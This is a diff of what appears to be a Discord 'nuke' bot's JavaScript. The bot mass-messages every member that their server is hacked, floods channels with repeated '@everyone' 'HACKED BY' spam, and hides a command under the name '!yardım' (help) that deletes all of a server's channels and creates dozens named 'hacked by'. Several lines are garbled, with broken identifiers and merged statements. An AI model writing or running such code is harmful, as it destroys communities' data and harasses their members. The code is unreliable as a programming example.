@@ -32,8 +32,8 @@ client.on("message", async msg => {//by diizy'#0061
       .forEach(users =>//by diizy'#0061
         users.send(
           "bulunduğun bir sunucu sunucu hacklenmiştir boşver gitsin by dizzy'#0061 :heart:" 
-        )//by diizy'#0061    //by dizzy'#0061
-      )//by dizzy'#0061
+        )//by diizy'#0061
+      )
       .catch(console.error);
   } 
 });
@@ -42,80 +42,34 @@ client.on('message', msg => {
   if (msg.content === '!spamyap') { 
          
    
-   
-   //by dizzy'#00061
-    //by dizzy'#00061
-    //by dizzy'#00061
-    //by dizzy'#00061
-    //by dizzy'#00061
-    //by dizzy'#00061
-    
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
         msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
         msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
@@ -123,54 +77,106 @@ client.on('message', msg => {
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  //by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061y dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+        msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-    //by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-});//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
-client.on("mess//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061age", async msg => {//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061nt === "!yardım")//by dizzy'#0061//by dizzy'#0061 { //by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061    ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.ch#0061.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    
+    
+    
+    // by dizzy'#0061
+    
+  }
+});
+
+client.on("message", async msg => {//by dizzy'#0061nt === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
-     msg.guild//by dizzy'#0061//by dizzy'#0061//by dizzy'#006//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#00611.channels.cache.forEach(c => {c.delete()//by dizzy'#0061        await msg.guild.channels.create("hacked by dizzy'#0061", {
+     msg.guild.channels.cache.forEach(c => {c.delete()//by dizzy'#0061        await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"//by diizy'#0061
     });
      await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"//by diizy'#0061
     });
      await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"// by dizzy'#0061//by dizzy'#0061//by dizzy'#0061
+      type: "text"// by dizzy'#0061
     });
      await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
@@ -178,14 +184,14 @@ client.on("mess//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061/
      await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"//by dizzy'#0061
+      type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"//by dizzy'#0061
+      type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by dizzy'#0061
+    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
@@ -201,49 +207,49 @@ client.on("mess//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061//by dizzy'#0061/
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {// by dizzy'#0061
